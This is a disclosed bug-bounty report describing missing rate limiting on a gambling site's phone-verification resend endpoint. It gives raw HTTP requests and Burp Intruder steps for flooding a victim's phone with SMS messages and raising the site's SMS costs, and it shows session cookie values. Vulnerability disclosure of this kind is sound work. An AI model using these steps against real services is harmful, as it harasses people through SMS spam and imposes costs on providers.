# Improper validation at Phone verification (possible cost increase + SMS SPAM attack)

## Report Details
- **Report ID**: 263010
- **URL**: https://hackerone.com/reports/263010
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-08-24T14:15:10.294Z
- **Disclosed**: 2017-09-24T21:28:23.656Z

## Reporter
- **Username**: luciann
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**

**Summary:** 
Improper validation at Phone verification is allowing an attacker to exhaust the SMS delivery system.

**Description:** 
Improper validation at Phone verification is allowing an attacker to exhaust the SMS delivery system probably increasing the cost of the subscription for that SMS service.  

Also this can be used as a SMS SPAM Attack! (I am spamming myself at the moment at a rate of 1 SMS per 2 minutes .... using over a few hundred SMS's .. f*ck!)

## Browsers Verified In:

  * Chrome
  * Firefox

## Steps To Reproduce:

1. Log in
2. Enter mobile  number of you target/victim (you, if you want to rage a few minutes later)
3. Verify 
4. Intercept request of resend
5. Edit request

```
POST /apiv2/user/verifytelephone HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: https://unikrn.com/profile
Content-Type: application/json
Application-Version: v3.8.5-28-g570b4be
Content-Length: 60
Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff
Connection: close

{"session_id":"lcso6bc6vv2jcf7ebukdfgrfm3s38v6a","resend":1}
```

6. Sent to intruder and grep "1" as follows:

```
POST /apiv2/user/verifytelephone HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: https://unikrn.com/profile
Content-Type: application/json
Application-Version: v3.8.5-28-g570b4be
Content-Length: 60
Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff
Connection: close

{"session_id":"lcso6bc6vv2jcf7ebukdfgrfm3s38v6a","resend":§1§}
```

7. Make a count integer and send. 
8. DO NOT VALIDATE PHONE
9. Wait 22 minutes (no joke)
10. Edit account information
11. Save
12. SPAM + Possible cost increase

= !<number of resend/integer number in intruder>

## Supporting Material/References:

  * List of printscreen

## Fun Request moment:
  * Can you stop the SMS's? I am going to the mountain side and I will not have a charger or any kind of charging options.


## Attachments
- photo_2017-08-24_17-08-45.jpg
- photo_2017-08-24_17-08-40.jpg
- photo_2017-08-24_17-08-49.jpg
- photo_2017-08-24_17-09-34.jpg
- photo_2017-08-24_17-09-38.jpg
